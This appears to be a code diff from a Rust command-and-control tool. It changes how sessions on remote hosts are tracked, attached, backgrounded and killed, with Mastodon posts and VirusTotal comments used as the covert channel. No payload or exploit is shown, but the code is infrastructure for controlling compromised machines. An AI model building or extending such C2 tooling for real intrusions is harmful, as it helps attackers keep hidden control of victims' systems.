@@ -3,7 +3,7 @@ use std::process::exit;
 use colored::*;
 
 use crate::args::{Options,Social};
-use crate::c2::shell::EXIT_FAILURE;
+use crate::c2::shell::{Environnement,EXIT_FAILURE};
 use crate::modules::{rec2mastodon,rec2virustotal};
 
 use regex::Regex;
@@ -22,6 +22,7 @@ pub struct Session {
     pub user: String, // username
     pub hostname: String, // computer name
     pub os: String, // system version 
+    pub available: bool, // if session is killed set to false
 }
 
 /// Function to get sessions etablished from social network 
@@ -64,6 +65,34 @@ pub async fn get_sessions(default_args: &Options, sessions: &mut Vec<Session>) {
     }
 }
 
+
+/// Function to attach session id
+pub fn set_session(
+    id: u32,
+    env: &mut Environnement,
+    sessions: &mut Vec<Session>,
+) {
+    if id as usize <= sessions.len() {
+        env.selected_session_id = id;
+        env.information_target = format!("{}@{}",
+            sessions[env.selected_session_id as usize - 1].user,
+            sessions[env.selected_session_id as usize - 1].hostname
+        );
+    }
+    else {
+        error!("Session id not found...");
+    }
+}
+
+/// Function to attach session id
+pub fn background_sessions(
+    env: &mut Environnement,
+) {
+    env.selected_session_id = 0;
+    println!("Session in background..");
+}
+
+
 /// Function to parse and push sessions in the vector
 fn parse_sessions(
     default_args: &Options,
@@ -72,15 +101,11 @@ fn parse_sessions(
     sessions: &mut Vec<Session>,
 ) {
     let mut already_get = false;
-    let mut k = 1;
     for i in 0..result_content.len() {
         let (_msg_type, session_hash, _job_hash) = parse_session_spoiler(&result_spoiler[i]);
         for j in 0..sessions.len() {
             if sessions[j].hash.contains(&session_hash) {
                 trace!("Session '{}' already saved..",&session_hash);
-                if sessions[j].id != k {
-                    sessions[j].id = k;
-                }
                 already_get = true;
             }
         } 
@@ -88,15 +113,15 @@ fn parse_sessions(
             let (username, hostname, os) = parse_newsessioninfo(&result_content[i], &default_args.key);
             sessions.push(
                 Session {
-                    id: k as u32,
+                    id: (sessions.len() as u32 + 1),
                     hash: session_hash.to_owned(),
                     user: username,
                     hostname: hostname,
                     os: os,
+                    available: true,
                 }
             );
         }
-        k +=1;
     }
 }
 
@@ -104,19 +129,21 @@ fn parse_sessions(
 pub fn display_sessions(sessions: &mut Vec<Session>) {
     if sessions.len() != 0 {
         for session in sessions {
-            let mut username = session.user.green().bold();
-            if session.user.to_lowercase().contains("root") || session.user.to_lowercase().contains("system") || session.user.to_lowercase().contains("administrat") {
-                username = session.user.red().bold()
+            if session.available == true {
+                let mut username = session.user.green().bold();
+                if session.user.to_lowercase().contains("root") || session.user.to_lowercase().contains("system") || session.user.to_lowercase().contains("administrat") {
+                    username = session.user.red().bold()
+                }
+                println!("{:<4}{}","",
+                    format!("SESSION_ID:{:<2}  HASH:{:<8}  USER:{:<8}  HOSTNAME:{:<18}  OS:{:15}",
+                        (session.id).to_string().green().bold(),
+                        (session.hash).to_string().green().bold(),
+                        username,
+                        session.hostname.green().bold(),
+                        session.os.green().bold(),
+                    )
+                );
             }
-            println!("{:<4}{}","",
-                format!("SESSION_ID:{:<2}  HASH:{:<8}  USER:{:<8}  HOSTNAME:{:<18}  OS:{:15}",
-                    (session.id).to_string().green().bold(),
-                    (session.hash).to_string().green().bold(),
-                    username,
-                    session.hostname.green().bold(),
-                    session.os.green().bold(),
-                )
-            );
         }
     } else {
         println!("No sessions..");
@@ -202,8 +229,8 @@ pub async fn kill_session(
             }
             else {
                 let (_url,vtype, resource_id) = rec2virustotal::parse_virustotal_url(&default_args.url);
-                let mut removed = false;
-                for session in sessions.to_owned() {
+                let mut disabled = false;
+                for session in sessions {
                     if session.id == session_id {
                         let (_result_spoiler,_result_content,post_id) = rec2virustotal::virustotal_get_comments(
                             &default_args.token,
@@ -218,14 +245,12 @@ pub async fn kill_session(
                             ).await;
                             debug!("Unlink session ID:{} with comment ID:{} deleted!",&session.hash,&id);
                             println!("Session {}:{} killed!",&session_id.to_string().red().bold(),&session.hash.red().bold());
-                            removed =true;
+                            disabled =true;
                         }
+                        session.available = false;
                     }
                 }
-                if removed {
-                    sessions.remove(session_id.to_owned() as usize - 1);
-                }
-                else {
+                if !disabled {
                     error!("No session to kill with this ID..");
                 }
             }
